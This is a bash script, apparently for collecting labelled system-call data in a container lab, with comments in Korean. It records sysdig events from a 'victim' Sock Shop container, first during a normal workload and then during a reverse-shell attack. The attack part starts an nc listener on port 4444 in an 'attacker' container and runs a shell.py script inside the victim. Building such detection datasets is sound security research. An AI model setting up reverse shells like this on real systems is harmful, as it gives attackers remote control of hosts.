#!/bin/bash

OUTPUT_DIR="/home/marine/attack_data"

echo "==============================="
echo "Sock Shop 방법2 — victim 컨테이너 리버스 쉘"
echo "==============================="

# 1단계: sysdig 수집 시작
echo "[$(date +%T)] sysdig 수집 시작"
echo "COLLECTION_START: $(date +%s%N)" > $OUTPUT_DIR/timeline_sockshop_m2.txt
rm -f $OUTPUT_DIR/sockshop_m2_raw.json
sudo bash -c "nohup sysdig -j 'container.name=victim' >> $OUTPUT_DIR/sockshop_m2_raw.json 2>/dev/null &"
sleep 2

# 2단계: 정상 구간 60초 (workload.sh + Sock Shop 트래픽)
echo "[$(date +%T)] victim 워크로드 시작"
docker exec -d victim bash /tmp/workload.sh
sleep 2

echo "[$(date +%T)] 정상 구간 시작 (60초)"
echo "NORMAL_START: $(date +%s%N)" >> $OUTPUT_DIR/timeline_sockshop_m2.txt
sleep 60

# 3단계: attacker 준비
echo "[$(date +%T)] attacker 리버스 쉘 대기"
docker exec attacker pkill nc 2>/dev/null
docker exec -d attacker bash -c "nc -lvp 4444 > /tmp/sockshop_m2_shell.txt 2>&1"
sleep 2

# 4단계: 공격 시작
echo "[$(date +%T)] 공격 시작"
echo "ATTACK_START: $(date +%s%N)" >> $OUTPUT_DIR/timeline_sockshop_m2.txt
docker exec victim bash -c "python3 /tmp/shell.py &"

# 5단계: 공격 구간 120초
echo "[$(date +%T)] 공격 구간 유지 (120초)"
sleep 120

# 6단계: 수집 종료
echo "[$(date +%T)] 수집 종료"
echo "ATTACK_END: $(date +%s%N)" >> $OUTPUT_DIR/timeline_sockshop_m2.txt

sudo pkill sysdig 2>/dev/null
docker exec victim pkill -f workload.sh 2>/dev/null
docker exec attacker pkill nc 2>/dev/null

echo "==============================="
echo "완료! 결과 확인:"
ls -lh $OUTPUT_DIR/sockshop_m2_raw.json
echo "이벤트 수: $(wc -l < $OUTPUT_DIR/sockshop_m2_raw.json)"
cat $OUTPUT_DIR/timeline_sockshop_m2.txt
echo "==============================="
